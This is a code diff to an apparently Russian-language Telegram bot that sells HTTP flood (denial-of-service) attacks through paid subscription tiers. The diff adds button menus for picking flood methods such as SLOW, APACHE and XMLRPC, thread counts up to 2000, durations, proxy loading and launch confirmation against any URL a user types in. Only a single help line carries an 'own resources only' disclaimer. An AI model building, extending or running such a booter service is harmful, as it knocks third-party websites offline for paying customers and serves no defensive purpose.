@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-DIMSTAT BOT — HTTP-ФЛУД (только команда /attack)
+DIMSTAT BOT — HTTP-ФЛУД (управление кнопками, надёжное состояние)
 """
 
 import asyncio
@@ -15,7 +15,7 @@ from typing import List
 
 import aiohttp
 import requests
-from aiogram import Bot, Dispatcher, types
+from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiohttp import web
@@ -37,6 +37,11 @@ WEBHOOK_URL = "https://llosdfisojdfouisdf-production.up.railway.app/webhook"
 # ==============================
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
+
+# Хранилище состояний пользователей (без FSM)
+user_data_cache = {}  # {user_id: {'step': str, 'method': str, 'url': str, 'threads': int, 'duration': int}}
+
+# Активные атаки
 active_attacks = {}
 
 # ==============================
@@ -267,13 +272,17 @@ async def run_attack_wrapper(user_id, method, url, threads, duration):
         return f"Ошибка: {e}"
 
 # ==============================
-# КЛАВИАТУРА
+# КЛАВИАТУРЫ
 # ==============================
 def main_menu():
     return InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="⏹️ Остановить атаку", callback_data="attack_stop"),
-            InlineKeyboardButton(text="📊 Статус", callback_data="status")
+            InlineKeyboardButton(text="🚀 Запустить атаку", callback_data="attack_start"),
+            InlineKeyboardButton(text="⏹️ Остановить атаку", callback_data="attack_stop")
+        ],
+        [
+            InlineKeyboardButton(text="📊 Статус", callback_data="status"),
+            InlineKeyboardButton(text="💡 Помощь", callback_data="help")
         ],
         [
             InlineKeyboardButton(text="💎 Купить подписку", callback_data="buy_tier"),
@@ -305,6 +314,72 @@ def buy_tier_menu():
         [
             InlineKeyboardButton(text="💥 Мощный (799 ₽)", callback_data="tier_pro"),
             InlineKeyboardButton(text="⬅️ Назад", callback_data="back_main")
+        ]
+    ])
+
+def method_menu():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="🌐 GET", callback_data="m_GET"),
+            InlineKeyboardButton(text="📨 POST", callback_data="m_POST")
+        ],
+        [
+            InlineKeyboardButton(text="🔹 HEAD", callback_data="m_HEAD"),
+            InlineKeyboardButton(text="🐢 SLOW", callback_data="m_SLOW")
+        ],
+        [
+            InlineKeyboardButton(text="🔧 APACHE", callback_data="m_APACHE"),
+            InlineKeyboardButton(text="📦 XMLRPC", callback_data="m_XMLRPC")
+        ],
+        [
+            InlineKeyboardButton(text="⬅️ Назад", callback_data="back_main")
+        ]
+    ])
+
+def threads_menu():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="50", callback_data="t_50"),
+            InlineKeyboardButton(text="100", callback_data="t_100")
+        ],
+        [
+            InlineKeyboardButton(text="200", callback_data="t_200"),
+            InlineKeyboardButton(text="500", callback_data="t_500")
+        ],
+        [
+            InlineKeyboardButton(text="1000", callback_data="t_1000"),
+            InlineKeyboardButton(text="2000", callback_data="t_2000")
+        ],
+        [
+            InlineKeyboardButton(text="🔢 Своё", callback_data="t_custom"),
+            InlineKeyboardButton(text="⬅️ Назад", callback_data="back_main")
+        ]
+    ])
+
+def duration_menu():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="⏱️ 30 сек", callback_data="d_30"),
+            InlineKeyboardButton(text="⏱️ 60 сек", callback_data="d_60")
+        ],
+        [
+            InlineKeyboardButton(text="⏱️ 120 сек", callback_data="d_120"),
+            InlineKeyboardButton(text="⏱️ 300 сек", callback_data="d_300")
+        ],
+        [
+            InlineKeyboardButton(text="⏱️ 600 сек", callback_data="d_600"),
+            InlineKeyboardButton(text="🔢 Своё", callback_data="d_custom")
+        ],
+        [
+            InlineKeyboardButton(text="⬅️ Назад", callback_data="back_main")
+        ]
+    ])
+
+def confirm_menu():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="✅ Запустить", callback_data="confirm_launch"),
+            InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_attack")
         ]
     ])
 
@@ -342,7 +417,7 @@ def generate_report(method, url, threads, duration, elapsed, output):
 """
 
 # ==============================
-# ОБРАБОТЧИКИ КОМАНД
+# ОБРАБОТЧИКИ КОМАНД И CALLBACK
 # ==============================
 @dp.message(Command("start"))
 async def start_cmd(message: types.Message):
@@ -352,125 +427,39 @@ async def start_cmd(message: types.Message):
         f"🌟 <b>DIMSTAT HTTP-ФЛУД БОТ</b>\n\n"
         f"👤 Тариф: {tier_name}\n"
         f"💎 Баланс: {user['balance']} ⭐\n\n"
-        f"🚀 Используй команду:\n"
-        f"<code>/attack МЕТОД URL ПОТОКИ ДЛИТЕЛЬНОСТЬ</code>\n\n"
-        f"Пример: <code>/attack POST https://example.com 100 60</code>\n\n"
-        f"Доступные методы: GET, POST, HEAD, SLOW, APACHE, XMLRPC",
+        f"🚀 Управляй атаками через кнопки.",
         parse_mode="HTML",
         reply_markup=main_menu()
     )
 
-@dp.message(Command("attack"))
-async def attack_command(message: types.Message):
-    user_id = message.from_user.id
-
-    # Проверяем, не запущена ли уже атака
-    if user_id in active_attacks:
-        await message.answer("⚠️ У вас уже есть активная атака! Остановите её сначала.")
-        return
-
-    # Парсим аргументы
-    args = message.text.split()
-    if len(args) != 5:
-        await message.answer(
-            "❌ Неправильный формат.\n"
-            "Используйте: <code>/attack МЕТОД URL ПОТОКИ ДЛИТЕЛЬНОСТЬ</code>\n"
-            "Пример: <code>/attack POST https://example.com 100 60</code>",
-            parse_mode="HTML"
-        )
-        return
-
-    _, method, url, threads_str, duration_str = args
-    method = method.upper()
-    if method not in ["GET", "POST", "HEAD", "SLOW", "APACHE", "XMLRPC"]:
-        await message.answer("❌ Неизвестный метод. Доступны: GET, POST, HEAD, SLOW, APACHE, XMLRPC")
-        return
-
-    try:
-        threads = int(threads_str)
-        duration = int(duration_str)
-    except ValueError:
-        await message.answer("❌ Потоки и длительность должны быть числами.")
-        return
-
-    if not url.startswith("http"):
-        url = "https://" + url
-
-    # Проверка тарифа
-    user = get_user(user_id)
-    tier = user["tier"]
-    if threads > TIERS[tier]["max_threads"]:
-        await message.answer(f"❌ Твой тариф разрешает максимум {TIERS[tier]['max_threads']} потоков.")
-        return
-    if duration > TIERS[tier]["max_duration"]:
-        await message.answer(f"❌ Твой тариф разрешает максимум {TIERS[tier]['max_duration']} сек.")
-        return
-
-    # Обновляем прокси перед атакой
-    update_proxies()
-
-    # Отправляем сообщение о запуске
-    msg = await message.answer(
-        f"🚀 <b>Атака запускается...</b>\n\n"
-        f"🎯 Метод: {method}\n"
-        f"🌐 URL: {html.escape(url)}\n"
-        f"🧵 Потоков: {threads}\n"
-        f"⏱️ Длительность: {duration} сек",
-        parse_mode="HTML",
-        reply_markup=main_menu()
-    )
-
-    # Запускаем атаку в фоне
-    active_attacks[user_id] = {
-        "start_time": time.time(),
-        "duration": duration,
-        "method": method,
-        "url": url,
-        "threads": threads,
-        "msg": msg
-    }
-
-    asyncio.create_task(monitor_attack(user_id, msg))
-
-async def monitor_attack(user_id, msg):
-    data = active_attacks.get(user_id)
-    if not data:
-        return
-    method = data["method"]
-    url = data["url"]
-    threads = data["threads"]
-    duration = data["duration"]
-
-    result = await run_attack_wrapper(user_id, method, url, threads, duration)
-
-    if user_id in active_attacks:
-        del active_attacks[user_id]
-
-    elapsed = time.time() - data["start_time"]
-    report_text = generate_report(method, url, threads, duration, elapsed, result)
-
-    try:
-        await msg.edit_text(
-            f"✅ <b>Атака завершена!</b>\n\n"
-            f"📄 <b>Отчёт:</b>\n"
-            f"<code>{html.escape(report_text)}</code>",
-            parse_mode="HTML",
-            reply_markup=main_menu()
-        )
-    except:
-        await bot.send_message(
-            chat_id=user_id,
-            text=f"✅ Атака завершена!\n\n{report_text}",
-            reply_markup=main_menu()
-        )
-
-# ==============================
-# ОБРАБОТЧИКИ КНОПОК
-# ==============================
 @dp.callback_query(F.data == "back_main")
 async def back_main(callback: types.CallbackQuery):
     await safe_answer(callback)
+    user_id = callback.from_user.id
+    if user_id in user_data_cache:
+        del user_data_cache[user_id]
     await send_new(callback.message, "🌟 Главное меню", reply_markup=main_menu())
+
+@dp.callback_query(F.data == "cancel_attack")
+async def cancel_attack(callback: types.CallbackQuery):
+    await safe_answer(callback)
+    user_id = callback.from_user.id
+    if user_id in user_data_cache:
+        del user_data_cache[user_id]
+    await send_new(callback.message, "❌ Атака отменена.", reply_markup=main_menu())
+
+@dp.callback_query(F.data == "help")
+async def help_cmd(callback: types.CallbackQuery):
+    await safe_answer(callback)
+    await send_new(
+        callback.message,
+        "📖 <b>Помощь</b>\n\n"
+        "🚀 Запустить атаку — выбери метод, затем следуй инструкциям.\n"
+        "⏹️ Остановить атаку.\n"
+        "📊 Статус.\n\n"
+        "⚠️ Используй только на своих ресурсах!",
+        reply_markup=main_menu()
+    )
 
 @dp.callback_query(F.data == "status")
 async def status_cmd(callback: types.CallbackQuery):
@@ -492,16 +481,6 @@ async def status_cmd(callback: types.CallbackQuery):
         )
     else:
         await send_new(callback.message, "✅ Активных атак нет.", reply_markup=main_menu())
-
-@dp.callback_query(F.data == "attack_stop")
-async def stop_attack_cmd(callback: types.CallbackQuery):
-    await safe_answer(callback)
-    user_id = callback.from_user.id
-    if user_id in active_attacks:
-        del active_attacks[user_id]
-        await send_new(callback.message, "🛑 Атака остановлена.", reply_markup=main_menu())
-    else:
-        await send_new(callback.message, "❌ Нет активной атаки.", reply_markup=main_menu())
 
 @dp.callback_query(F.data == "buy_tier")
 async def buy_tier(callback: types.CallbackQuery):
@@ -555,6 +534,178 @@ async def my_tier(callback: types.CallbackQuery):
         f"📅 {expiry_text}",
         reply_markup=main_menu()
     )
+
+@dp.callback_query(F.data == "attack_start")
+async def attack_start(callback: types.CallbackQuery):
+    await safe_answer(callback)
+    user_id = callback.from_user.id
+    if user_id in active_attacks:
+        await safe_answer(callback, "⚠️ Уже есть активная атака!", show_alert=True)
+        return
+    # Инициализируем состояние
+    user_data_cache[user_id] = {"step": "method"}
+    await send_new(callback.message, "🎯 Выберите метод:", reply_markup=method_menu())
+
+@dp.callback_query(F.data.startswith("m_"))
+async def method_choose(callback: types.CallbackQuery):
+    await safe_answer(callback)
+    user_id = callback.from_user.id
+    method = callback.data.split("_")[1]
+    if user_id not in user_data_cache:
+        user_data_cache[user_id] = {}
+    user_data_cache[user_id]["method"] = method
+    user_data_cache[user_id]["step"] = "url"
+    await send_new(callback.message, f"✅ Метод: {method}\n\nВведите URL (например, example.com):", reply_markup=None)
+
+@dp.callback_query(F.data.startswith("t_"))
+async def threads_choose(callback: types.CallbackQuery):
+    await safe_answer(callback)
+    user_id = callback.from_user.id
+    if user_id not in user_data_cache or user_data_cache[user_id].get("step") not in ("threads", "url"):
+        await send_new(callback.message, "❌ Сначала введите URL.", reply_markup=main_menu())
+        return
+    val = callback.data.split("_")[1]
+    if val == "custom":
+        await send_new(callback.message, "🔢 Введите количество потоков:", reply_markup=None)
+        return
+    threads = int(val)
+    tier = get_user(user_id)["tier"]
+    max_thr = TIERS[tier]["max_threads"]
+    if threads > max_thr:
+        await safe_answer(callback, f"⚠️ Твой тариф разрешает до {max_thr} потоков!", show_alert=True)
+        return
+    user_data_cache[user_id]["threads"] = threads
+    user_data_cache[user_id]["step"] = "duration"
+    await send_new(callback.message, f"🧵 Потоки: {threads}\n\nВыберите длительность:", reply_markup=duration_menu())
+
+@dp.callback_query(F.data.startswith("d_"))
+async def duration_choose(callback: types.CallbackQuery):
+    await safe_answer(callback)
+    user_id = callback.from_user.id
+    if user_id not in user_data_cache or user_data_cache[user_id].get("step") != "duration":
+        await send_new(callback.message, "❌ Сначала выберите потоки.", reply_markup=main_menu())
+        return
+    val = callback.data.split("_")[1]
+    if val == "custom":
+        await send_new(callback.message, "⏱️ Введите длительность (сек):", reply_markup=None)
+        return
+    duration = int(val)
+    tier = get_user(user_id)["tier"]
+    max_dur = TIERS[tier]["max_duration"]
+    if duration > max_dur:
+        await safe_answer(callback, f"⚠️ Твой тариф разрешает до {max_dur} сек!", show_alert=True)
+        return
+    user_data_cache[user_id]["duration"] = duration
+    user_data_cache[user_id]["step"] = "confirm"
+    data = user_data_cache[user_id]
+    await send_new(
+        callback.message,
+        f"📋 <b>Проверьте параметры</b>\n\n"
+        f"🎯 Метод: {data['method']}\n"
+        f"🌐 URL: {html.escape(data['url'])}\n"
+        f"🧵 Потоки: {data['threads']}\n"
+        f"⏱️ Длительность: {duration} сек\n\n"
+        f"🔄 Загружаю прокси... (это может занять несколько секунд)\n\n"
+        f"Запускаем?",
+        parse_mode="HTML",
+        reply_markup=confirm_menu()
+    )
+
+@dp.callback_query(F.data == "confirm_launch")
+async def confirm_launch(callback: types.CallbackQuery):
+    await safe_answer(callback)
+    user_id = callback.from_user.id
+    if user_id not in user_data_cache or user_data_cache[user_id].get("step") != "confirm":
+        await send_new(callback.message, "❌ Ошибка: начните заново.", reply_markup=main_menu())
+        return
+
+    data = user_data_cache.pop(user_id)
+    method = data.get("method")
+    url = data.get("url")
+    threads = data.get("threads")
+    duration = data.get("duration")
+
+    if not all([method, url, threads, duration]):
+        await send_new(callback.message, "❌ Ошибка: не хватает данных. Начните заново.", reply_markup=main_menu())
+        return
+
+    tier = get_user(user_id)["tier"]
+    if threads > TIERS[tier]["max_threads"] or duration > TIERS[tier]["max_duration"]:
+        await send_new(
+            callback.message,
+            f"⚠️ Твой тариф не позволяет такие параметры!\n"
+            f"Макс. потоки: {TIERS[tier]['max_threads']}, макс. время: {TIERS[tier]['max_duration']} сек.",
+            reply_markup=main_menu()
+        )
+        return
+
+    # Обновляем прокси
+    update_proxies()
+
+    # Отправляем сообщение о начале
+    msg = await callback.message.answer(
+        f"🚀 <b>Атака запускается...</b>\n\n"
+        f"🎯 Метод: {method}\n"
+        f"🌐 URL: {html.escape(url)}\n"
+        f"🧵 Потоков: {threads}\n"
+        f"⏱️ Длительность: {duration} сек",
+        parse_mode="HTML",
+        reply_markup=main_menu()
+    )
+
+    # Запускаем атаку в фоне
+    active_attacks[user_id] = {
+        "start_time": time.time(),
+        "duration": duration,
+        "method": method,
+        "url": url,
+        "threads": threads,
+        "msg": msg
+    }
+
+    asyncio.create_task(monitor_attack(user_id, msg))
+
+async def monitor_attack(user_id, msg):
+    data = active_attacks.get(user_id)
+    if not data:
+        return
+    method = data["method"]
+    url = data["url"]
+    threads = data["threads"]
+    duration = data["duration"]
+
+    result = await run_attack_wrapper(user_id, method, url, threads, duration)
+
+    if user_id in active_attacks:
+        del active_attacks[user_id]
+
+    elapsed = time.time() - data["start_time"]
+    report_text = generate_report(method, url, threads, duration, elapsed, result)
+
+    try:
+        await msg.edit_text(
+            f"✅ <b>Атака завершена!</b>\n\n"
+            f"📄 <b>Отчёт:</b>\n"
+            f"<code>{html.escape(report_text)}</code>",
+            parse_mode="HTML",
+            reply_markup=main_menu()
+        )
+    except:
+        await bot.send_message(
+            chat_id=user_id,
+            text=f"✅ Атака завершена!\n\n{report_text}",
+            reply_markup=main_menu()
+        )
+
+@dp.callback_query(F.data == "attack_stop")
+async def stop_attack_cmd(callback: types.CallbackQuery):
+    await safe_answer(callback)
+    user_id = callback.from_user.id
+    if user_id in active_attacks:
+        del active_attacks[user_id]
+        await send_new(callback.message, "🛑 Атака остановлена.", reply_markup=main_menu())
+    else:
+        await send_new(callback.message, "❌ Нет активной атаки.", reply_markup=main_menu())
 
 @dp.callback_query(F.data == "admin_panel")
 async def admin_panel(callback: types.CallbackQuery):
@@ -612,6 +763,7 @@ async def admin_give(callback: types.CallbackQuery):
     await safe_answer(callback)
     if not is_admin(callback.from_user.id):
         return
+    user_data_cache[callback.from_user.id] = {"step": "give_tier"}
     await send_new(
         callback.message,
         "💎 <b>Выдать подписку</b>\n\n"
@@ -622,29 +774,117 @@ async def admin_give(callback: types.CallbackQuery):
         reply_markup=admin_menu()
     )
 
+# ==============================
+# ОБРАБОТКА ТЕКСТОВЫХ СООБЩЕНИЙ
+# ==============================
 @dp.message(F.text)
-async def handle_admin_give(message: types.Message):
-    # Если админ вводит данные для выдачи тарифа
-    if not is_admin(message.from_user.id):
+async def handle_text(message: types.Message):
+    user_id = message.from_user.id
+    text = message.text.strip()
+
+    # Если пользователь не в процессе настройки — игнорируем, кроме админских команд
+    if user_id not in user_data_cache:
+        # Проверяем, не админ ли это вводит данные для выдачи тарифа
+        if is_admin(user_id):
+            parts = text.split()
+            if len(parts) == 2 and parts[0].isdigit() and parts[1] in TIERS:
+                target_id = int(parts[0])
+                tier = parts[1]
+                set_user_tier(target_id, tier)
+                await message.answer(f"✅ Пользователю {target_id} назначен {TIERS[tier]['name']}")
+                try:
+                    await bot.send_message(target_id, f"🎉 Вам назначен тариф {TIERS[tier]['name']}!")
+                except:
+                    pass
+                return
         return
-    parts = message.text.strip().split()
-    if len(parts) != 2:
+
+    state = user_data_cache[user_id]
+    step = state.get("step")
+
+    # Обработка выдачи тарифа админом
+    if step == "give_tier":
+        parts = text.split()
+        if len(parts) != 2:
+            await message.answer("❌ Формат: ID ТАРИФ\nНапример: 123456789 pro")
+            return
+        target_id_str, tier = parts
+        if not target_id_str.isdigit():
+            await message.answer("❌ ID должен быть числом.")
+            return
+        target_id = int(target_id_str)
+        if tier not in TIERS:
+            await message.answer("❌ Доступные тарифы: free, medium, pro")
+            return
+        set_user_tier(target_id, tier)
+        await message.answer(f"✅ Пользователю {target_id} назначен {TIERS[tier]['name']}")
+        try:
+            await bot.send_message(target_id, f"🎉 Вам назначен тариф {TIERS[tier]['name']}!")
+        except:
+            pass
+        del user_data_cache[user_id]
         return
-    target_id_str, tier = parts
-    if not target_id_str.isdigit():
+
+    # Обработка ввода URL
+    if step == "url":
+        url = text
+        if not url.startswith("http"):
+            url = "https://" + url
+        state["url"] = url
+        state["step"] = "threads"
+        await message.answer(f"✅ URL: {url}\n\nВыберите потоки:", reply_markup=threads_menu())
         return
-    if tier not in TIERS:
+
+    # Обработка ввода потоков вручную
+    if step == "threads":
+        try:
+            threads = int(text)
+        except ValueError:
+            await message.answer("❌ Введите число.")
+            return
+        tier = get_user(user_id)["tier"]
+        max_thr = TIERS[tier]["max_threads"]
+        if threads < 1 or threads > max_thr:
+            await message.answer(f"❌ Твой тариф разрешает до {max_thr} потоков.")
+            return
+        state["threads"] = threads
+        state["step"] = "duration"
+        await message.answer(f"🧵 Потоки: {threads}\n\nВыберите длительность:", reply_markup=duration_menu())
         return
-    target_id = int(target_id_str)
-    set_user_tier(target_id, tier)
-    await message.answer(f"✅ Пользователю {target_id} назначен {TIERS[tier]['name']}")
-    try:
-        await bot.send_message(target_id, f"🎉 Вам назначен тариф {TIERS[tier]['name']}!")
-    except:
-        pass
+
+    # Обработка ввода длительности вручную
+    if step == "duration":
+        try:
+            duration = int(text)
+        except ValueError:
+            await message.answer("❌ Введите число.")
+            return
+        tier = get_user(user_id)["tier"]
+        max_dur = TIERS[tier]["max_duration"]
+        if duration < 1 or duration > max_dur:
+            await message.answer(f"❌ Твой тариф разрешает до {max_dur} сек.")
+            return
+        state["duration"] = duration
+        state["step"] = "confirm"
+        data = state
+        await message.answer(
+            f"📋 <b>Проверьте параметры</b>\n\n"
+            f"🎯 Метод: {data['method']}\n"
+            f"🌐 URL: {html.escape(data['url'])}\n"
+            f"🧵 Потоки: {data['threads']}\n"
+            f"⏱️ Длительность: {duration} сек\n\n"
+            f"🔄 Загружаю прокси... (это может занять несколько секунд)\n\n"
+            f"Запускаем?",
+            parse_mode="HTML",
+            reply_markup=confirm_menu()
+        )
+        return
+
+    # Если что-то пошло не так
+    await message.answer("❌ Неизвестная команда. Начните заново через /start")
 
 # ==============================
-# ВЕБХУК
+# ВЕБХУК-СЕРВЕР
 # ==============================
 async def handle_webhook(request):
     try:
